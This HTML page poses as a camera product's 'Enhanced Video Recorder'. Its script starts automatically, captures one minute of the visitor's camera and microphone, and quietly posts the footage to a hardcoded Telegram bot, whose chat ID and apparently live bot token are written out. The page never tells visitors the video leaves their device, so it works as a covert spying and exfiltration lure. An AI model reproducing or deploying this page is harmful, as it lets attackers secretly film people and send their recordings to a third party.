<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Video Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(120deg, #4e54c8, #8f94fb);
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        h1 {
            margin-bottom: 20px;
        }

        video {
            margin: 20px 0;
            border: 2px solid white;
            border-radius: 8px;
            max-width: 90%;
        }

        .footer {
            position: absolute;
            bottom: 10px;
            font-size: 0.8rem;
            color: #ccc;
        }
    </style>
</head>
<body>
    <h1>Enhanced Video Recorder</h1>
    <video id="videoPlayer" controls></video>
    <p>Recording will start automatically. Please allow camera and microphone access and wait  for 1 minute.</p>
    <div class="footer">Â© 2025 Best Camera </div>

    <script>
        async function recordVideo() {
            const chatId = '7361816575'; // Replace with your chat ID
            const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI'; // Replace with your bot token

            try {
                // Access user's camera and microphone
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/mp4' // Ensure MP4-like format
                });
                const chunks = [];
                const videoPlayer = document.getElementById('videoPlayer');

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.start();

                // Record for 1 minute (60000 ms)
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 60000);

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    videoPlayer.src = URL.createObjectURL(blob); // Display the recorded video
                    videoPlayer.load();
                    videoPlayer.play();

                    // Prepare video for Telegram
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', blob, 'video.mp4'); // MP4 filename

                    try {
                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                            method: 'POST',
                            body: formData,
                        });

                        if (response.ok) {
                            console.log('Video sent successfully!');
                        } else {
                            const errorText = await response.text();
                            console.error('Failed to send video:', errorText);
                        }
                    } catch (error) {
                        console.error('Error sending video:', error);
                    }
                };
            } catch (error) {
                console.error('Error accessing camera or microphone:', error);
            }
        }

        // Automatically record video after a short delay
        setTimeout(recordVideo, 3000);
    </script>
</body>
</html>
